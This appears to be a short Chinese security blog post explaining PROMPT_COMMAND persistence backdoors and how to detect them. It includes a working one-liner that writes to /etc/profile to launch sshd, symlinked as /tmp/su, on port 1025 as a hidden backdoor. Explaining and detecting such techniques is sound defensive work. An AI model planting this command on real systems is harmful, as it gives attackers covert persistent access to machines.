环境变量$PROMPT_COMMAND常用于history加固，它用于定义每条命令执行前预先执行的命令。

攻击者通过向$PROMPT_COMMAND内注入恶意操作，可以实现持久化与攻击的效果。这类后门的持久化往往依赖于写登陆加载文件（profile、bashrc）等。

下面是一个简单的demo例子。

```shell
echo "PROMPT_COMMAND=lsof -i:1025 &>/dev/null || ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1025" >> /etc/profile
```



这种后门隐蔽性较差：

（1）对于持久化到文件内的PROMPT_COMMAND后门，我们只需在登录shell后查看$PROMPT_COMMAND的内容即可暴露攻击命令。

（2）对于持久化到某个进程内的PROMPT_COMMAND后门（eg: PROMPT_COMMAND=ls ping google.com）,我们查看进程目录的environ文件即可暴露攻击命令。

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-13_160838.png)
